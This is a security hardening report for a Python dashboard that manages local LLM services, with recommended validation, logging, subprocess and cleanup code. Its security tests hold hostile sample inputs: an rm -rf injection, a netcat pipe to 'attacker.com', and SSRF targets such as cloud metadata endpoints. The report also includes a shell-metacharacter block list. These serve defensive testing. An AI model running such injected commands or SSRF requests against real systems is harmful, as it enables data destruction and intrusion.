# Python Code Quality & Security Hardening Recommendations

**Target**: `scripts/ai-dashboard` (AI Backend Dashboard Script)
**Date**: 2025-10-25
**Focus Areas**: Input validation, logging security, exception handling, type checking, subprocess security, resource cleanup

---

## Executive Summary

This document provides actionable recommendations to harden the AI dashboard script against security vulnerabilities and improve code quality for production deployment. The script currently handles sensitive operations (systemctl commands, HTTP requests to local services, GPU monitoring) and requires enhanced security controls.

**Priority Levels**:
- 🔴 **CRITICAL**: Security vulnerabilities, data exposure risks
- 🟡 **HIGH**: Production reliability, error handling
- 🟢 **MEDIUM**: Code quality, maintainability

---

## 1. Input Validation Best Practices

### 1.1 Environment Variable Validation with Pydantic (🟡 HIGH)

**Current State**: Basic validation with range checks
```python
# Current approach (lines 52-60)
DEFAULT_HTTP_TIMEOUT: float = float(os.getenv("AI_DASH_HTTP_TIMEOUT", "3.0"))
DEFAULT_REFRESH_INTERVAL: int = int(os.getenv("AI_DASH_REFRESH_INTERVAL", "5"))

if not 0.5 <= DEFAULT_HTTP_TIMEOUT <= 30:
    raise ValueError(f"Invalid HTTP_TIMEOUT: {DEFAULT_HTTP_TIMEOUT}")
```

**Problems**:
- Manual validation scattered across code
- No centralized configuration schema
- ValueError exceptions lack context for debugging
- Type conversion failures unhandled (e.g., `float("invalid")`)

**Recommended Approach**: Use Pydantic Settings for robust validation

```python
from pydantic import Field, field_validator, ValidationError
from pydantic_settings import BaseSettings, SettingsConfigDict
from typing import Annotated

class DashboardConfig(BaseSettings):
    """Validated configuration for AI dashboard.

    All settings can be overridden via environment variables with AI_DASH_ prefix.
    Example: export AI_DASH_HTTP_TIMEOUT=5.0
    """

    model_config = SettingsConfigDict(
        env_prefix='AI_DASH_',
        env_file='.env',
        env_file_encoding='utf-8',
        case_sensitive=False,
        validate_default=True,
    )

    http_timeout: Annotated[float, Field(
        default=3.0,
        ge=0.5,
        le=30.0,
        description="HTTP request timeout in seconds"
    )]

    refresh_interval: Annotated[int, Field(
        default=5,
        ge=1,
        le=60,
        description="Auto-refresh interval in seconds"
    )]

    log_height: Annotated[int, Field(
        default=12,
        ge=5,
        le=50,
        description="Event log widget height in lines"
    )]

    max_retry_attempts: Annotated[int, Field(
        default=3,
        ge=0,
        le=10,
        description="Maximum retry attempts for failed operations"
    )]

    systemctl_timeout: Annotated[float, Field(
        default=8.0,
        ge=1.0,
        le=30.0,
        description="Timeout for systemctl commands in seconds"
    )]

    @field_validator('http_timeout', 'systemctl_timeout')
    @classmethod
    def validate_positive_timeout(cls, v: float) -> float:
        """Ensure timeout values are reasonable for production."""
        if v < 0.5:
            raise ValueError("Timeout too short for reliable network operations")
        return v

    @field_validator('refresh_interval')
    @classmethod
    def validate_refresh_reasonable(cls, v: int) -> int:
        """Prevent excessive refresh rates that could impact performance."""
        if v < 1:
            raise ValueError("Refresh interval must be at least 1 second")
        return v


# Usage in script (replace lines 47-60)
try:
    config = DashboardConfig()
    DEFAULT_HTTP_TIMEOUT = config.http_timeout
    DEFAULT_REFRESH_INTERVAL = config.refresh_interval
    DEFAULT_LOG_HEIGHT = config.log_height
except ValidationError as e:
    # Provide clear error messages for configuration issues
    logger.error("Configuration validation failed:")
    for error in e.errors():
        field = '.'.join(str(loc) for loc in error['loc'])
        logger.error(f"  {field}: {error['msg']} (input: {error['input']})")
    raise SystemExit(1) from e
```

**Benefits**:
- Centralized configuration schema with documentation
- Automatic type conversion with validation
- Clear error messages with field-level details
- Support for `.env` files for development
- Type safety for configuration access
- Easy to extend with new settings

**Installation**: `pip install pydantic-settings`

---

### 1.2 Service Name Allowlist Validation (🔴 CRITICAL)

**Current State**: Service names constructed from user-controlled dictionary keys
```python
def _service_name(self, key: str) -> str | None:
    record = self.PROVIDERS.get(key)
    return None if record is None else str(record["service"])
```

**Security Risk**: If `key` comes from external input (future enhancement), malicious service names could be constructed.

**Recommended Approach**: Strict allowlist validation

```python
from typing import Literal, Final

# Define allowed service names as literal type
AllowedServiceName = Literal[
    'ollama.service',
    'vllm.service',
    'llamacpp-python.service',
    'llama-cpp-native.service',
    'litellm.service'
]

# Frozen set for runtime validation
ALLOWED_SERVICES: Final[frozenset[str]] = frozenset([
    'ollama.service',
    'vllm.service',
    'llamacpp-python.service',
    'llama-cpp-native.service',
    'litellm.service'
])

def _service_name(self, key: str) -> str | None:
    """Get systemd service name with allowlist validation.

    Args:
        key: Provider key from PROVIDERS registry

    Returns:
        Validated service name or None if key invalid

    Security:
        Service names are validated against ALLOWED_SERVICES to prevent
        command injection via malicious service name construction.
    """
    record = self.PROVIDERS.get(key)
    if record is None:
        return None

    service = str(record["service"])

    # SECURITY: Validate against allowlist before use in subprocess
    if service not in ALLOWED_SERVICES:
        logger.error(
            f"Security violation: Service '{service}' not in allowlist. "
            f"Allowed: {ALLOWED_SERVICES}"
        )
        return None

    return service
```

**Benefits**:
- Prevents command injection via malicious service names
- Type-safe with Literal type annotation
- Runtime validation with frozenset
- Clear security boundary documented

---

### 1.3 URL Endpoint Validation (🔴 CRITICAL)

**Current State**: URLs hard-coded but never validated before use
```python
endpoint = str(cfg["endpoint"])  # line 344
response = requests.get(endpoint, timeout=DEFAULT_HTTP_TIMEOUT)  # line 353
```

**Security Risk**: If endpoints become configurable (future enhancement), SSRF vulnerabilities possible.

**Recommended Approach**: Validate URL scheme and host

```python
from urllib.parse import urlparse
from typing import Final

# Allowlist for local services only
ALLOWED_URL_SCHEMES: Final[frozenset[str]] = frozenset(['http', 'https'])
ALLOWED_HOSTS: Final[frozenset[str]] = frozenset(['127.0.0.1', 'localhost'])

def _validate_endpoint(self, endpoint: str) -> bool:
    """Validate endpoint URL against security policy.

    Args:
        endpoint: URL string to validate

    Returns:
        True if endpoint is safe to use, False otherwise

    Security:
        Only allows HTTP(S) requests to localhost to prevent SSRF attacks.
    """
    try:
        parsed = urlparse(endpoint)

        # Check scheme
        if parsed.scheme not in ALLOWED_URL_SCHEMES:
            logger.warning(
                f"Rejected endpoint with disallowed scheme: {parsed.scheme} "
                f"(endpoint: {endpoint})"
            )
            return False

        # Check host
        if parsed.hostname not in ALLOWED_HOSTS:
            logger.warning(
                f"Rejected endpoint with disallowed host: {parsed.hostname} "
                f"(endpoint: {endpoint})"
            )
            return False

        # Check port is in reasonable range
        if parsed.port and not (1 <= parsed.port <= 65535):
            logger.warning(
                f"Rejected endpoint with invalid port: {parsed.port} "
                f"(endpoint: {endpoint})"
            )
            return False

        return True

    except Exception as e:
        logger.error(f"URL validation error for '{endpoint}': {type(e).__name__}: {e}")
        return False

# Usage in collect_snapshot (before line 353)
endpoint = str(cfg["endpoint"])
if not self._validate_endpoint(endpoint):
    notes.append("Invalid endpoint URL")
    status = "degraded" if required else "inactive"
    continue
```

**Benefits**:
- Prevents SSRF (Server-Side Request Forgery) attacks
- Validates URL structure before network calls
- Enforces localhost-only policy
- Easy to extend for additional security checks

---

## 2. Logging Security

### 2.1 Avoid Sensitive Data in Logs (🔴 CRITICAL)

**Current State**: Generic exception logging may expose sensitive data
```python
logger.debug(f"{key}: Request failed: {type(e).__name__}: {e}")  # line 380
```

**Security Risk**: Exception messages may contain:
- API tokens in headers (if added in future)
- Internal paths, PIDs, configuration details
- Full URLs with query parameters

**Recommended Approach**: Structured, sanitized logging

```python
import re
from typing import Any, Dict

class SanitizingLogger:
    """Wrapper for structured logging with automatic PII/sensitive data redaction."""

    # Patterns for sensitive data (add more as needed)
    SENSITIVE_PATTERNS: Final[list[tuple[re.Pattern, str]]] = [
        (re.compile(r'token["\s:=]+([a-zA-Z0-9_-]+)', re.IGNORECASE), 'token=***REDACTED***'),
        (re.compile(r'password["\s:=]+([^\s,}]+)', re.IGNORECASE), 'password=***REDACTED***'),
        (re.compile(r'api[_-]?key["\s:=]+([a-zA-Z0-9_-]+)', re.IGNORECASE), 'api_key=***REDACTED***'),
        (re.compile(r'/home/[^/\s]+'), '/home/***USER***'),  # Redact usernames in paths
    ]

    @staticmethod
    def sanitize(message: str) -> str:
        """Remove sensitive data from log messages."""
        sanitized = message
        for pattern, replacement in SanitizingLogger.SENSITIVE_PATTERNS:
            sanitized = pattern.sub(replacement, sanitized)
        return sanitized

    @staticmethod
    def log_error_safely(logger_instance, message: str, exception: Exception | None = None, **kwargs):
        """Log error with sanitization and structured context.

        Args:
            logger_instance: Logger instance to use
            message: Human-readable error description
            exception: Optional exception object (only type and safe attributes logged)
            **kwargs: Additional context (will be sanitized)
        """
        # Build structured log entry
        log_data: Dict[str, Any] = {
            'message': SanitizingLogger.sanitize(message),
            'context': {k: SanitizingLogger.sanitize(str(v)) for k, v in kwargs.items()}
        }

        if exception:
            log_data['exception'] = {
                'type': type(exception).__name__,
                # Only log safe exception attributes
                'safe_message': str(exception)[:200],  # Truncate to prevent log flooding
            }

        logger_instance.error(
            f"{log_data['message']} | context={log_data['context']}"
            + (f" | exception={log_data['exception']}" if exception else "")
        )

# Usage examples (replace existing logging calls)

# Before (line 380, potentially unsafe):
logger.debug(f"{key}: Request failed: {type(e).__name__}: {e}")

# After (safe):
SanitizingLogger.log_error_safely(
    logger,
    f"{key}: HTTP request failed",
    exception=e,
    provider_key=key,
    endpoint_host=urlparse(endpoint).hostname,  # Log hostname, not full URL
    timeout=DEFAULT_HTTP_TIMEOUT
)

# Before (line 375, potentially unsafe):
logger.debug(f"{key}: Connection error: {e}")

# After (safe):
SanitizingLogger.log_error_safely(
    logger,
    f"{key}: Failed to connect to provider endpoint",
    exception=e,
    provider_key=key,
    required=required
)
```

**Benefits**:
- Prevents accidental logging of tokens, passwords, credentials
- Structured logging for better log analysis
- Automatic PII redaction (usernames in paths)
- Truncation prevents log flooding attacks
- Easy to extend patterns for new sensitive data types

---

### 2.2 Structured Logging with JSON Format (🟢 MEDIUM)

**Current State**: Basic string formatting for logs
```python
logging.basicConfig(level=logging.DEBUG)  # line 49
```

**Recommended Approach**: JSON structured logging for production

```python
import json
import logging
from datetime import datetime
from typing import Any, Dict

class JSONFormatter(logging.Formatter):
    """Format log records as JSON for structured logging systems."""

    def format(self, record: logging.LogRecord) -> str:
        """Format log record as JSON string."""
        log_obj: Dict[str, Any] = {
            'timestamp': datetime.utcnow().isoformat() + 'Z',
            'level': record.levelname,
            'logger': record.name,
            'message': record.getMessage(),
            'module': record.module,
            'function': record.funcName,
            'line': record.lineno,
        }

        # Add exception info if present
        if record.exc_info:
            log_obj['exception'] = {
                'type': record.exc_info[0].__name__ if record.exc_info[0] else None,
                'message': str(record.exc_info[1]) if record.exc_info[1] else None,
            }

        # Add extra fields if present
        if hasattr(record, 'context'):
            log_obj['context'] = record.context

        return json.dumps(log_obj)

# Configure structured logging (replace line 47-49)
def setup_logging(log_level: str = 'INFO', json_format: bool = True):
    """Configure application logging with security best practices.

    Args:
        log_level: Logging level (DEBUG, INFO, WARNING, ERROR, CRITICAL)
        json_format: If True, use JSON formatting; if False, use human-readable format
    """
    logger = logging.getLogger(__name__)
    handler = logging.StreamHandler()

    if json_format:
        handler.setFormatter(JSONFormatter())
    else:
        handler.setFormatter(logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(name)s:%(funcName)s:%(lineno)d | %(message)s'
        ))

    logger.addHandler(handler)
    logger.setLevel(getattr(logging, log_level.upper(), logging.INFO))

    return logger

# Usage
logger = setup_logging(
    log_level=os.getenv('LOG_LEVEL', 'INFO'),
    json_format=os.getenv('LOG_FORMAT', 'json') == 'json'
)
```

**Benefits**:
- Easy integration with log aggregation systems (ELK, Splunk, CloudWatch)
- Structured context for better analysis
- Machine-parseable format
- Consistent timestamp format (ISO 8601 UTC)

---

## 3. Exception Handling Patterns

### 3.1 Specific Exception Handling (🟡 HIGH)

**Current State**: Broad exception catching
```python
except Exception as e:  # pragma: no cover
    logger.warning(f"Unexpected error initializing GPU monitor: {type(e).__name__}: {e}")
```

**Problems**:
- Catches too broad exception types
- Makes debugging harder
- May hide programming errors

**Recommended Approach**: Specific exception types with appropriate handling

```python
# GPU Monitor initialization (lines 114-136)
def __init__(self) -> None:
    """Initialize GPU monitor with NVML.

    Raises:
        RuntimeError: If NVML initialization fails with unexpected error
    """
    self.initialized = False
    self.device_count = 0
    self._pynvml = None

    try:
        with warnings.catch_warnings():
            warnings.filterwarnings(
                "ignore",
                message="The pynvml package is deprecated",
                category=FutureWarning,
            )
            import pynvml

        pynvml.nvmlInit()
        self._pynvml = pynvml
        self.initialized = True
        self.device_count = pynvml.nvmlDeviceGetCount()
        logger.info(f"GPU monitoring initialized: {self.device_count} device(s) detected")

    except ImportError as e:
        # Expected on systems without NVIDIA drivers
        logger.debug(f"NVIDIA GPU driver not available: {e}")
        self.initialized = False

    except (OSError, RuntimeError) as e:
        # Expected when NVML not available or GPU in use
        logger.debug(f"NVIDIA NVML initialization failed: {e}")
        self.initialized = False

    except Exception as e:
        # Unexpected errors should be visible
        logger.error(
            f"Unexpected error initializing GPU monitor: {type(e).__name__}: {e}",
            exc_info=True  # Include traceback for debugging
        )
        self.initialized = False
        # Re-raise in development, gracefully degrade in production
        if os.getenv('ENV') == 'development':
            raise RuntimeError(f"GPU monitor initialization failed unexpectedly") from e

# Subprocess calls (lines 292-298)
def _get_service_pid(self, key: str) -> int | None:
    """Get main PID for systemd service.

    Args:
        key: Provider key

    Returns:
        Process ID if service running, None otherwise
    """
    service = self._service_name(key)
    if not service:
        return None

    try:
        result = subprocess.run(
            ["systemctl", "--user", "show", service, "--property=MainPID", "--value"],
            capture_output=True,
            text=True,
            check=False,
            timeout=2,
        )

        if result.returncode != 0:
            logger.debug(
                f"systemctl returned non-zero exit code for {service}: "
                f"code={result.returncode}, stderr={result.stderr[:100]}"
            )
            return None

    except subprocess.TimeoutExpired as e:
        logger.warning(f"systemctl command timed out for {service} after {e.timeout}s")
        return None

    except FileNotFoundError as e:
        # systemctl not available (non-systemd system)
        logger.error(f"systemctl not found - are you on a systemd-based system? {e}")
        return None

    except PermissionError as e:
        # User doesn't have permission to run systemctl
        logger.error(f"Permission denied running systemctl for {service}: {e}")
        return None

    except subprocess.SubprocessError as e:
        # Other subprocess errors
        logger.error(
            f"Subprocess error querying {service} PID: {type(e).__name__}: {e}",
            exc_info=True
        )
        return None

    # Parse PID from output
    value = result.stdout.strip()
    if not value:
        return None

    try:
        pid = int(value)
        return pid if pid > 0 else None
    except ValueError as e:
        logger.warning(f"Invalid PID value '{value}' from systemctl for {service}: {e}")
        return None
```

**Benefits**:
- Precise error handling for each failure mode
- Better error messages for debugging
- Appropriate handling for expected vs unexpected errors
- Traceback included for unexpected errors

---

### 3.2 Context Managers for Resource Cleanup (🟡 HIGH)

**Current State**: Manual cleanup in exception handlers
```python
try:
    response = requests.get(endpoint, timeout=DEFAULT_HTTP_TIMEOUT)
    # ... process response ...
except requests.exceptions.RequestException as e:
    # ... handle error ...
```

**Problem**: Response objects may not be properly closed on errors.

**Recommended Approach**: Use context managers

```python
from contextlib import contextmanager
from typing import Iterator
import requests

@contextmanager
def safe_http_request(
    endpoint: str,
    timeout: float,
    method: str = 'GET',
    **kwargs
) -> Iterator[requests.Response | None]:
    """Context manager for safe HTTP requests with automatic cleanup.

    Args:
        endpoint: URL to request
        timeout: Request timeout in seconds
        method: HTTP method (GET, POST, etc.)
        **kwargs: Additional arguments for requests

    Yields:
        Response object if successful, None on error

    Example:
        with safe_http_request(url, timeout=3.0) as response:
            if response and response.ok:
                data = response.json()
    """
    response = None
    try:
        response = requests.request(
            method=method,
            url=endpoint,
            timeout=timeout,
            **kwargs
        )
        yield response
    except requests.exceptions.Timeout:
        logger.debug(f"Request timeout for {endpoint} after {timeout}s")
        yield None
    except requests.exceptions.ConnectionError:
        logger.debug(f"Connection failed for {endpoint}")
        yield None
    except requests.exceptions.RequestException as e:
        logger.warning(f"Request error for {endpoint}: {type(e).__name__}")
        yield None
    finally:
        # Ensure response is closed even on errors
        if response is not None:
            try:
                response.close()
            except Exception as e:
                logger.debug(f"Error closing response: {e}")

# Usage in collect_snapshot (replace lines 352-382)
start = time.perf_counter()
status = "inactive"
models = 0

with safe_http_request(endpoint, DEFAULT_HTTP_TIMEOUT) as response:
    elapsed_ms = (time.perf_counter() - start) * 1000

    if response and response.ok:
        try:
            payload = response.json()
            status = "active"
            models = self._parse_models(key, payload)
        except ValueError as e:
            logger.debug(f"{key}: Invalid JSON response: {e}")
            notes.append("Invalid JSON payload")
            status = "degraded" if required else "inactive"
    elif response:
        notes.append(f"HTTP {response.status_code} {response.reason}")
        status = "degraded" if required else "inactive"
    else:
        # Request failed (logged by context manager)
        notes.append("Request failed")
        status = "degraded" if required else "inactive"
```

**Benefits**:
- Automatic resource cleanup
- Cleaner error handling
- No resource leaks on exceptions
- Reusable across multiple request sites

---

## 4. Type Checking with Mypy

### 4.1 Mypy Configuration File (🟢 MEDIUM)

**Current State**: No mypy configuration

**Recommended**: Create `mypy.ini` in project root

```ini
[mypy]
# Global options
python_version = 3.11
warn_return_any = True
warn_unused_configs = True
warn_redundant_casts = True
warn_unused_ignores = True
check_untyped_defs = True
disallow_untyped_defs = True
disallow_incomplete_defs = True
disallow_untyped_calls = True
disallow_untyped_decorators = True
no_implicit_optional = True
strict_optional = True
warn_unreachable = True
show_error_codes = True
show_column_numbers = True

# Cache configuration
cache_dir = .mypy_cache
incremental = True
sqlite_cache = True

# Output formatting
color_output = True
error_summary = True
pretty = True

# Exclude patterns
exclude = (?x)(
    ^build/
    | ^\.venv/
    | ^venv/
    | ^__pycache__/
  )

# Per-module configuration

[mypy-tests.*]
# Relax strictness for test files
disallow_untyped_defs = False
disallow_untyped_calls = False

[mypy-pynvml.*]
# Third-party library without stubs
ignore_missing_imports = True

[mypy-psutil.*]
# Third-party library (may have partial stubs)
ignore_missing_imports = True

[mypy-textual.*]
# Third-party library (Textual TUI framework)
ignore_missing_imports = True

[mypy-requests.*]
# Third-party library with type stubs
# Note: Install types-requests for better checking
ignore_missing_imports = False
```

**Installation**: `pip install mypy types-requests types-psutil`

**Usage**:
```bash
# Check entire scripts directory
mypy scripts/

# Check specific file
mypy scripts/ai-dashboard

# Check with strict mode
mypy --strict scripts/ai-dashboard
```

---

### 4.2 Type Annotation Improvements (🟢 MEDIUM)

**Current Issues**: Some return types could be more specific

**Recommended Improvements**:

```python
from typing import TypedDict, NotRequired, Final, Literal

# Define typed dictionaries for provider configuration
class ProviderConfig(TypedDict):
    """Type definition for provider configuration entries."""
    endpoint: str
    display: str
    service: str
    required: bool
    type: Literal['ollama', 'litellm']

# Define return type for GPU info
class GPUInfo(TypedDict):
    """Type definition for GPU information."""
    id: float
    name: str
    memory_total_mb: float
    memory_used_mb: float
    memory_util_percent: float
    gpu_util_percent: float

# Update method signatures with precise types
class GPUMonitor:
    def get_gpu_info(self) -> list[GPUInfo]:
        """Query all GPU information and memory stats.

        Returns:
            List of GPU info dicts with memory and utilization metrics.
            Empty list if GPU monitoring not available.
        """
        if not self.initialized or self._pynvml is None:
            return []
        # ... implementation ...

    def get_process_vram(self) -> dict[int, tuple[float, float]]:
        """Return VRAM usage per PID.

        Returns:
            Dict mapping PIDs to (used_mb, percent) tuples.
            Empty dict if GPU monitoring not available.
        """
        # ... implementation ...

# Type-safe provider registry
PROVIDERS: Final[dict[str, ProviderConfig]] = {
    "ollama": {
        "endpoint": "http://127.0.0.1:11434/api/tags",
        "display": "Ollama",
        "service": "ollama.service",
        "required": False,
        "type": "ollama",
    },
    # ... other providers ...
}
```

**Benefits**:
- Catch type errors at development time
- Better IDE autocomplete
- Self-documenting code
- Safer refactoring

---

## 5. Subprocess Security

### 5.1 Command Injection Prevention (🔴 CRITICAL)

**Current State**: Good - already using list format
```python
subprocess.run(
    ["systemctl", "--user", action, service],  # Correct: list format
    # ... other args ...
)
```

**✅ Current implementation is secure**: Uses list arguments without `shell=True`

**Additional Hardening**:

```python
from typing import Final
import shlex

# Command allowlist
ALLOWED_SYSTEMCTL_ACTIONS: Final[frozenset[str]] = frozenset([
    'start', 'stop', 'restart', 'enable', 'disable', 'status', 'show'
])

def systemctl(self, key: str, action: str) -> bool:
    """Execute systemctl command with strict validation.

    Args:
        key: Provider key
        action: systemctl action (start, stop, restart, enable, disable)

    Returns:
        True if command succeeded, False otherwise

    Security:
        - Validates action against ALLOWED_SYSTEMCTL_ACTIONS allowlist
        - Validates service name against ALLOWED_SERVICES
        - Uses list arguments (no shell=True)
        - Strict timeout enforcement
    """
    # Validate action against allowlist
    if action not in ALLOWED_SYSTEMCTL_ACTIONS:
        logger.error(
            f"Security violation: systemctl action '{action}' not allowed. "
            f"Allowed actions: {ALLOWED_SYSTEMCTL_ACTIONS}"
        )
        return False

    # Get and validate service name
    service = self._service_name(key)
    if not service:
        logger.error(f"Invalid or disallowed service for provider '{key}'")
        return False

    # SECURITY: Additional validation - ensure no shell metacharacters
    # Even though we're not using shell=True, defense in depth
    for value in [action, service]:
        if any(char in value for char in ['|', '&', ';', '\n', '$(', '`', '<', '>']):
            logger.error(
                f"Security violation: Shell metacharacter detected in systemctl command. "
                f"action={action}, service={service}"
            )
            return False

    try:
        # Build command with validated components
        cmd = ["systemctl", "--user", action, service]

        # Log command for audit trail (safe since validated)
        logger.info(f"Executing systemctl command: {shlex.join(cmd)}")

        result = subprocess.run(
            cmd,
            check=True,
            stdout=subprocess.PIPE,  # Capture for logging
            stderr=subprocess.PIPE,  # Capture for error analysis
            timeout=config.systemctl_timeout,
            # SECURITY: Never use shell=True
            shell=False,
            # SECURITY: Close all file descriptors except stdin/stdout/stderr
            close_fds=True,
        )

        if result.stdout:
            logger.debug(f"systemctl stdout: {result.stdout.decode('utf-8', errors='replace')[:500]}")

        return True

    except subprocess.TimeoutExpired as e:
        logger.warning(
            f"systemctl {action} timed out for {service} after {e.timeout}s"
        )
        return False

    except subprocess.CalledProcessError as e:
        logger.error(
            f"systemctl {action} failed for {service}: "
            f"exit_code={e.returncode}, "
            f"stderr={e.stderr.decode('utf-8', errors='replace')[:500] if e.stderr else 'N/A'}"
        )
        return False

    except Exception as e:
        logger.error(
            f"Unexpected error executing systemctl {action} for {service}: "
            f"{type(e).__name__}: {e}",
            exc_info=True
        )
        return False
```

**Benefits**:
- Defense in depth with multiple validation layers
- Audit trail for all systemctl commands
- Explicit timeout enforcement
- File descriptor cleanup
- No shell metacharacter injection possible

---

### 5.2 Subprocess Environment Sanitization (🟡 HIGH)

**Current State**: Inherits parent environment

**Recommended**: Minimal environment for subprocess calls

```python
import os
from typing import Dict

def get_safe_subprocess_env() -> Dict[str, str]:
    """Create minimal environment for subprocess execution.

    Returns:
        Dict with only essential environment variables

    Security:
        Prevents environment variable injection attacks by providing
        a minimal, controlled environment for subprocess calls.
    """
    # Start with empty environment
    safe_env: Dict[str, str] = {}

    # Only include essential variables
    essential_vars = ['PATH', 'HOME', 'USER', 'LANG', 'LC_ALL']

    for var in essential_vars:
        value = os.getenv(var)
        if value:
            safe_env[var] = value

    # Set safe defaults if not present
    if 'PATH' not in safe_env:
        safe_env['PATH'] = '/usr/local/bin:/usr/bin:/bin'

    if 'LANG' not in safe_env:
        safe_env['LANG'] = 'C.UTF-8'

    return safe_env

# Usage in systemctl method
result = subprocess.run(
    cmd,
    check=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    timeout=config.systemctl_timeout,
    shell=False,
    close_fds=True,
    env=get_safe_subprocess_env(),  # ← Sanitized environment
)
```

**Benefits**:
- Prevents environment variable injection
- Predictable subprocess behavior
- Reduces attack surface

---

## 6. Resource Cleanup Patterns

### 6.1 Application Lifecycle Management (🟡 HIGH)

**Current State**: No explicit cleanup on shutdown

**Recommended**: Implement cleanup handlers

```python
import atexit
import signal
from typing import Callable

class CleanupManager:
    """Manages application cleanup handlers."""

    def __init__(self):
        self._cleanup_handlers: list[Callable[[], None]] = []
        self._shutdown_initiated = False

        # Register signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

        # Register atexit handler
        atexit.register(self._cleanup)

    def register(self, handler: Callable[[], None]) -> None:
        """Register a cleanup handler.

        Args:
            handler: Callable to invoke during cleanup
        """
        self._cleanup_handlers.append(handler)

    def _signal_handler(self, signum: int, frame) -> None:
        """Handle termination signals."""
        logger.info(f"Received signal {signum}, initiating cleanup...")
        self._cleanup()
        raise SystemExit(0)

    def _cleanup(self) -> None:
        """Execute all registered cleanup handlers."""
        if self._shutdown_initiated:
            return  # Prevent double cleanup

        self._shutdown_initiated = True
        logger.info("Executing cleanup handlers...")

        for handler in reversed(self._cleanup_handlers):  # LIFO order
            try:
                handler()
            except Exception as e:
                logger.error(
                    f"Error in cleanup handler {handler.__name__}: {e}",
                    exc_info=True
                )

        logger.info("Cleanup completed")

# Usage in DashboardApp
class DashboardApp(App[None]):
    def __init__(self) -> None:
        super().__init__()
        self.monitor = ProviderMonitor()
        self.cleanup_manager = CleanupManager()

        # Register cleanup handlers
        self.cleanup_manager.register(self._cleanup_gpu_monitor)
        self.cleanup_manager.register(self._cleanup_timers)

    def _cleanup_gpu_monitor(self) -> None:
        """Clean up GPU monitor resources."""
        if hasattr(self.monitor, 'gpu_monitor') and self.monitor.gpu_monitor.initialized:
            try:
                if self.monitor.gpu_monitor._pynvml:
                    self.monitor.gpu_monitor._pynvml.nvmlShutdown()
                logger.info("GPU monitor shutdown complete")
            except Exception as e:
                logger.warning(f"Error shutting down GPU monitor: {e}")

    def _cleanup_timers(self) -> None:
        """Clean up active timers."""
        try:
            if hasattr(self, 'refresh_timer'):
                self.refresh_timer.stop()
            logger.info("Timers stopped")
        except Exception as e:
            logger.warning(f"Error stopping timers: {e}")
```

**Benefits**:
- Graceful shutdown on SIGINT/SIGTERM
- Proper resource cleanup
- LIFO cleanup order (reverse of initialization)
- No resource leaks

---

### 6.2 Context Manager for GPU Monitor (🟢 MEDIUM)

**Current State**: Manual initialization, no explicit cleanup

**Recommended**: Context manager pattern

```python
from contextlib import contextmanager
from typing import Iterator

@contextmanager
def gpu_monitor_context() -> Iterator[GPUMonitor]:
    """Context manager for GPU monitor lifecycle.

    Yields:
        Initialized GPUMonitor instance

    Example:
        with gpu_monitor_context() as gpu_mon:
            info = gpu_mon.get_gpu_info()
    """
    monitor = GPUMonitor()
    try:
        yield monitor
    finally:
        # Cleanup
        if monitor.initialized and monitor._pynvml:
            try:
                monitor._pynvml.nvmlShutdown()
                logger.debug("GPU monitor shutdown complete")
            except Exception as e:
                logger.warning(f"Error during GPU monitor cleanup: {e}")

# Usage
class ProviderMonitor:
    def __init__(self) -> None:
        self.gpu_monitor = GPUMonitor()
        # Register cleanup if needed
```

**Benefits**:
- Automatic resource cleanup
- Exception-safe
- Clear lifecycle boundaries

---

## 7. Implementation Priority & Roadmap

### Phase 1: Critical Security Fixes (Week 1)
1. ✅ Implement service name allowlist validation (Section 1.2)
2. ✅ Implement URL endpoint validation (Section 1.3)
3. ✅ Add logging sanitization (Section 2.1)
4. ✅ Harden subprocess security (Section 5.1, 5.2)

### Phase 2: Production Readiness (Week 2)
5. ✅ Implement Pydantic configuration validation (Section 1.1)
6. ✅ Improve exception handling patterns (Section 3.1)
7. ✅ Add context managers for resources (Section 3.2, 6.2)
8. ✅ Implement cleanup manager (Section 6.1)

### Phase 3: Code Quality (Week 3)
9. ✅ Add mypy configuration and fix type issues (Section 4.1, 4.2)
10. ✅ Implement structured JSON logging (Section 2.2)
11. ✅ Add comprehensive docstrings
12. ✅ Write unit tests for security-critical functions

---

## 8. Testing Recommendations

### 8.1 Security Test Cases

```python
import pytest
from ai_dashboard import ALLOWED_SERVICES, ALLOWED_SYSTEMCTL_ACTIONS

def test_service_name_allowlist_blocks_malicious():
    """Test that malicious service names are rejected."""
    monitor = ProviderMonitor()

    # Test shell metacharacters
    malicious_services = [
        "service; rm -rf /",
        "service|nc attacker.com 1234",
        "service`whoami`",
        "service$(malicious)",
    ]

    for malicious in malicious_services:
        # Should not be in allowlist
        assert malicious not in ALLOWED_SERVICES
        # Should be rejected by validation
        # (test implementation of _service_name with malicious input)

def test_systemctl_action_allowlist():
    """Test that only allowed systemctl actions are accepted."""
    monitor = ProviderMonitor()

    # Test disallowed actions
    disallowed = ["reboot", "poweroff", "halt", "exec", "kill"]
    for action in disallowed:
        assert action not in ALLOWED_SYSTEMCTL_ACTIONS
        result = monitor.systemctl("ollama", action)
        assert result is False  # Should reject

def test_url_validation_prevents_ssrf():
    """Test that URL validation prevents SSRF attacks."""
    monitor = ProviderMonitor()

    # Test disallowed hosts
    malicious_urls = [
        "http://192.168.1.1:8080/",  # Internal network
        "http://metadata.google.internal/",  # Cloud metadata
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "file:///etc/passwd",  # File protocol
        "ftp://example.com/",  # Wrong protocol
    ]

    for url in malicious_urls:
        assert monitor._validate_endpoint(url) is False

def test_logging_sanitization():
    """Test that sensitive data is redacted from logs."""
    test_cases = [
        ("token=abc123def456", "token=***REDACTED***"),
        ("password=secret123", "password=***REDACTED***"),
        ("api_key=xyz789", "api_key=***REDACTED***"),
        ("/home/username/file.txt", "/home/***USER***/file.txt"),
    ]

    for input_msg, expected_output in test_cases:
        sanitized = SanitizingLogger.sanitize(input_msg)
        assert expected_output in sanitized
        # Ensure original sensitive data not present
        assert "abc123def456" not in sanitized or input_msg == test_cases[0][0]
```

---

## 9. Deployment Checklist

Before deploying to production:

- [ ] All Phase 1 critical security fixes implemented
- [ ] Pydantic configuration validation in place
- [ ] Logging sanitization active
- [ ] Subprocess security hardened
- [ ] mypy type checking passing with no errors
- [ ] Security test suite passing
- [ ] Environment variables documented
- [ ] Log format set to JSON for production (`LOG_FORMAT=json`)
- [ ] Log level set appropriately (`LOG_LEVEL=INFO` or `WARNING`)
- [ ] Resource cleanup handlers registered
- [ ] Error handling tested for all failure modes
- [ ] Documentation updated with security considerations

